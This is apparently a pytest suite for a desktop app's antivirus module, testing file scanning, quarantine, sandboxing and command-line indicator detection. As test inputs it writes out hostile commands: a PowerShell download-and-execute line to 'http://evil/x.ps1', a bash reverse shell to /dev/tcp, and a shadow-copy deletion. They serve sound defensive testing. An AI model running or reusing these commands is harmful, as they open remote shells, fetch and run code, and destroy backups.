"""Tests for Ember's malware-defense layer (antivirus.py).

Runnable two ways:
    pytest test_antivirus.py
    python test_antivirus.py        # runs every test, prints a PASS/FAIL summary

All state (config + quarantine vault) is redirected to a throwaway directory and
VirusTotal is disabled, so the tests are hermetic and never touch the network or
the real user profile.
"""
import os
import tempfile
from pathlib import Path

# Isolate all on-disk state BEFORE importing the module under test.
_TMP = tempfile.mkdtemp(prefix="ember_av_test_")
os.environ["EMBER_SUPPORT_DIR"] = _TMP
os.environ.pop("VIRUSTOTAL_API_KEY", None)
os.environ.pop("VT_API_KEY", None)

import antivirus

# Belt-and-braces: ensure no online lookups happen during tests.
antivirus.set_config(vt_api_key="", vt_hash_lookup=False, vt_upload_unknown=False)


def _write(name: str, data) -> Path:
    p = Path(_TMP) / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return p


def test_clean_file_is_clean():
    p = _write("notes.txt", "just some harmless text\n")
    r = antivirus.scan_file(str(p), deep=False)
    assert r["ok"] and r["verdict"] == "clean", r


def test_eicar_is_malicious():
    p = _write("eicar.com", antivirus.EICAR_SIG)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "malicious", r


def test_executable_disguised_as_pdf_is_suspicious():
    p = _write("invoice.pdf", b"MZ\x90\x00" + b"\x00" * 64)  # PE magic in a "pdf"
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "suspicious", r
    assert any("disguised" in x for x in r["reasons"]), r


def test_double_extension_is_flagged():
    p = _write("photo.jpg.exe", b"MZ\x90\x00" + b"\x00" * 32)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] in ("suspicious", "malicious"), r


def test_quarantine_list_and_restore_roundtrip():
    p = _write("sample1.exe", b"MZ\x00\x00")
    q = antivirus.quarantine_file(str(p))
    assert q["ok"] and not p.exists(), q
    assert antivirus.list_quarantine()["count"] >= 1
    dest = Path(_TMP) / "restored.exe"
    r = antivirus.restore_quarantined(q["id"], str(dest))
    assert r["ok"] and dest.exists(), r


def test_purge_expired_deletes_after_grace_period():
    p = _write("sample2.exe", b"MZ\x00\x01")
    q = antivirus.quarantine_file(str(p))
    entries = antivirus._load_index()
    for e in entries:
        if e["id"] == q["id"]:
            e["delete_after"] = 1  # an epoch firmly in the past
    antivirus._save_index(entries)
    res = antivirus.purge_expired()
    assert q["id"] in res["purged"], res
    assert not Path(q["stored_path"]).exists()


def test_gate_download_quarantines_malicious():
    p = _write("download_eicar.bin", antivirus.EICAR_SIG)
    g = antivirus.gate_download(str(p))
    assert g["scanned"] and g["verdict"] == "malicious" and g.get("blocked"), g
    assert not p.exists()  # moved into quarantine


def test_gate_open_blocks_malicious_allows_clean():
    bad = _write("open_eicar.bin", antivirus.EICAR_SIG)
    gb = antivirus.gate_open(str(bad))
    assert gb["scanned"] and gb["allowed"] is False, gb
    good = _write("open_ok.txt", "hello\n")
    gg = antivirus.gate_open(str(good))
    assert gg["allowed"] is True, gg


def test_sandbox_runs_or_refuses_but_never_runs_unconfined():
    script = _write("hello.py", "print('hello from sandbox')\n")
    r = antivirus.run_in_sandbox(str(script), timeout=20)
    assert "ok" in r
    if r["ok"]:
        assert r.get("sandbox"), r          # ran -> must report which sandbox
    else:
        # No sandbox tech available -> it MUST refuse, not execute unconfined.
        assert "error" in r, r


def test_sandbox_refuses_known_malicious():
    bad = _write("evil.py", antivirus.EICAR_SIG)  # definitively malicious content
    r = antivirus.run_in_sandbox(str(bad), timeout=10)
    assert r["ok"] is False and r.get("refused") is True, r


def test_security_status_reports_engines():
    s = antivirus.security_status()
    assert s["ok"] and "heuristics" in s["engines_available"], s


def test_config_roundtrip():
    antivirus.set_config(autodelete_days=3)
    assert antivirus.get_config()["autodelete_days"] == 3
    antivirus.set_config(autodelete_days=7)


# --- stronger static analysis: entropy + behavioral IOCs -----------------------

def test_entropy_distinguishes_random_from_text():
    assert antivirus.shannon_entropy(os.urandom(8192)) > 7.5
    assert antivirus.shannon_entropy(b"the quick brown fox " * 400) < 5.0


def test_ioc_engine_flags_attacks_but_not_benign():
    bad = [
        "powershell -nop -w hidden -enc " + "A" * 60,
        'IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")',
        "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1",
        "vssadmin delete shadows /all /quiet",
    ]
    for c in bad:
        r = antivirus.scan_command_line(c)
        assert r["verdict"] == "malicious", (c, r)
    for c in ("ls -la", "git status", "python3 -m http.server"):
        assert antivirus.scan_command_line(c)["verdict"] == "clean", c


def test_script_with_ioc_is_flagged_not_clean():
    # A SCRIPT that carries a download-and-execute payload (high-severity IOC).
    # NB: IOC scanning is intentionally restricted to script types now — scanning prose
    # (.txt/.md) for indicator strings flagged docs + the scanner's own signature DB.
    body = ('echo hello\n'
            'IEX (New-Object Net.WebClient).DownloadString("http://evil/x.ps1")\n')
    p = _write("payload.ps1", body)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] in ("suspicious", "malicious"), r
    assert any("indicator" in x for x in r["reasons"]), r
    assert "ioc-signatures" in r["engines"], r


def test_prose_with_ioc_words_not_flagged():
    # A .txt/.md that merely MENTIONS techniques must NOT be flagged (false-positive guard).
    body = "Notes on mimikatz, vssadmin delete shadows, and reverse shells via /dev/tcp."
    p = _write("security_notes.md", body)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "clean", r


def test_compressed_container_not_flagged_on_entropy():
    # A high-entropy .dmg (every installer) must NOT be 'suspicious' just for entropy.
    import os
    p = _write("Installer.dmg", os.urandom(200_000))
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "clean", r


def test_signature_db_hash_is_malicious():
    import json
    from pathlib import Path
    p = _write("benign_payload.bin", b"totally ordinary bytes here")
    sha = antivirus.sha256_file(p)
    sig_path = Path(_TMP) / "signatures.json"
    sig_path.write_text(json.dumps({"sha256": [sha]}), "utf-8")
    antivirus._SIG_CACHE = None  # invalidate cache so the new DB is picked up
    try:
        r = antivirus.scan_file(str(p), deep=False)
        assert r["verdict"] == "malicious", r
    finally:
        sig_path.unlink(missing_ok=True)
        antivirus._SIG_CACHE = None


def test_archive_with_eicar_member_is_malicious():
    import zipfile
    z = Path(_TMP) / "bundle.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("notes.txt", "hello")
        zf.writestr("inner/payload.bin", antivirus.EICAR_SIG)
    r = antivirus.scan_file(str(z), deep=False)
    assert r["verdict"] == "malicious", r


def test_archive_with_disguised_exe_member_is_suspicious():
    import zipfile
    z = Path(_TMP) / "photos.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("vacation.jpg", b"MZ\x90\x00" + b"\x00" * 64)  # PE wearing .jpg
    r = antivirus.scan_file(str(z), deep=False)
    assert r["verdict"] == "suspicious", r
    assert "archive" in r["engines"], r


def test_clean_archive_is_clean():
    import zipfile
    z = Path(_TMP) / "clean.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("a.txt", "just text\n")
        zf.writestr("b.csv", "1,2,3\n")
    r = antivirus.scan_file(str(z), deep=False)
    assert r["verdict"] == "clean", r


def test_status_reports_strong_engines():
    s = antivirus.security_status()
    assert "ioc-signatures" in s["engines_available"], s
    assert "fileless-behavioral" in s["engines_available"], s
    assert "fileless_protection" in s


def _run_all() -> bool:
    import types
    funcs = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and isinstance(v, types.FunctionType)]
    passed = 0
    for fn in funcs:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
            passed += 1
        except Exception as e:
            print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{passed}/{len(funcs)} passed")
    return passed == len(funcs)


if __name__ == "__main__":
    import sys
    sys.exit(0 if _run_all() else 1)
